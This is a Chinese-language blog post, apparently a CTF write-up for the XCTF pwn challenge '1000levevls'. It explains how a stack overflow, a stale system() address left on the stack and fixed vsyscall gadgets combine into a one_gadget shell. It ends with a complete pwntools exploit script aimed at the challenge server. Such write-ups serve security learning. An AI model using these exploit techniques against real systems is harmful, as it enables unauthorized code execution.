<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-1000levevls-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修"><meta property="og:image" content><meta property="og:title" content="XCTF-1000levevls-WP"><meta property="og:description" content="一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/903.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-01-01T18:29:00+00:00"><meta property="article:modified_time" content="2021-01-01T18:29:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-1000levevls-WP"><meta name=twitter:description content="一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.44a18422ec0066708fd200e05feb946702a7b17e5d322ff1a35ef8be5c62ad32.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-1000levevls-WP</h1><div class=meta>Posted on Jan 1, 2021</div></div><section class=body><h5 id=一些废话><em>一些废话</em></h5><p><em>这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修改rbp实现leak system的四个字节（前提是发现ida的一个识别错误），处理起来非常的麻烦，可以说很难想出这个解法。当然我是什么解法都不会的，从网络上的wp中发现了非常容易实现的利用方法，但是在大多数机器上都无法实现利用，而xctf的靶机恰巧不属于这大多数</em></p><h3 id=初步分析>初步分析</h3><p><img src=https://www.cjovi.icu/usr/uploads/2021/01/4138640641.png alt=QQ截图20210101172711.png></p><p>这里是主要的漏洞点，就是一个栈溢出。如果这道题没用开pie那么随随便便就pwn了，但是可惜没如果，程序确实是开了pie的，也就是说我们什么地址都不知道，就没法rop了。</p><h3 id=更进一步>更进一步</h3><p>之前在学srop的时候其实有碰到，但是当时没仔细看</p><blockquote><p>有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下
<img src=https://www.cjovi.icu/usr/uploads/2021/01/3562116554.png alt=srop-gadget-2.png></p></blockquote><center style=font-size:14px;color:#C0C0C0;text-decoration:underline href=https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/srop-zh/#_3>引自CTF Wiki</center><p>这张图当时觉得长得奇奇怪怪的，自然的略过了，但是其实不仅对srop有用，对本题也非常有用，这三个vsyscall的地址是固定的（据说是内核层的，所以虚拟机无法模拟），每一个的效果都是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>syscall rax
</span></span><span style=display:flex><span>ret
</span></span></code></pre></div><p>也就是说可以充当一个pop_ret gadget，而且地址已知。有了这个gadget我们可以有限地控制程序的执行流程了。</p><h3 id=最后的解法>最后的解法</h3><p><img src=https://www.cjovi.icu/usr/uploads/2021/01/3137930142.png alt=QQ截图20210101174158.png>
<img src=https://www.cjovi.icu/usr/uploads/2021/01/1048574391.png alt=QQ截图20210101174404.png>
这个hint函数在反编译中表现为system的地址作为参数被传入sprintf，但是从汇编代码上来看，实际上在函数刚开始的时候system的地址就被存到栈中了，不论if的结果。
&amp;system被存在rbp-0x110
<img src=https://www.cjovi.icu/usr/uploads/2021/01/4116448379.png alt=QQ截图20210101174629.png>
巧的是go函数中的v5也在rbp-0x110，这个函数和hint函数的栈基地址是相同的，所以v5的初值就是system的地址，而只要在询问"how many levels?&ldquo;的时候输入一个小于等于0的数就可以避免v5被赋值，然后会再给我们一次输入的机会，输入的值直接加到v5上（这里的v5和v6的地址是相同的）。
考虑到手上有一个libc，就勉为其难的搜一波one_gadget吧，算出其与system的偏移在第二次输入就可以了。
这样我们我们就获得了一个可以get shell的地址，只要ret它就行了，ida分析出，v5与rsp相距0x10，看一看汇编代码也可以发现rsp在整个go函数调用漏洞函数前没有被修改过，call漏洞函数时，会压一个返回地址进去，所以one_gadget所在的内存和rbp被存储的内存相据0x10+0x8，我们用三个vsyscall就可以ret one_gadget实现get shell了。
<img src=https://www.cjovi.icu/usr/uploads/2021/01/3164727234.png alt=QQ截图20210101182230.png></p><p>这里的v6肯定远大于99，所以我们要先陪它玩99次乘法，然后在最后一次（也就是go函数直接调用的漏洞函数）进行栈溢出，就可以get shell了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>#context(log_level = &#39;debug&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh = remote(&#34;220.249.52.134&#34;,31264)
</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so&#34;)
</span></span><span style=display:flex><span>one_gadget_offset = 0x4526a - libc.symbols[&#39;system&#39;]
</span></span><span style=display:flex><span>vsyscall = 0xffffffffff600000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Choice:\n&#34;,&#39;2&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Choice:\n&#34;,&#39;1&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;levels?\n&#34;,&#39;0&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;more?\n&#34;,str(one_gadget_offset))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>for i in range(99):
</span></span><span style=display:flex><span>    sh.recvuntil(&#34;Question: &#34;)
</span></span><span style=display:flex><span>    lhs = int(sh.recvuntil(&#39; &#39;,drop = True),base = 10)
</span></span><span style=display:flex><span>    sh.recvuntil(&#34;* &#34;)
</span></span><span style=display:flex><span>    rhs = int(sh.recvuntil(&#39; &#39;,drop = True),base = 10)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Answer:&#34;,str(lhs * rhs))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Answer:&#34;,&#39;a&#39; * 0x30 + &#39;b&#39; * 0x8 + p64(vsyscall) * 3)
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><p>这个exp跑本地基本十有十二跑不通（应该不会有人用那些上古版本的Linux版本吧），但是靶机上是可以跑的。仔细想想此题在许多地方进行了非常巧合的布置，显然是希望我们用这样的方法做的，但是说实话这样和实战的距离就实在是太远了，权当开拓思路吧。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 © chuj | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>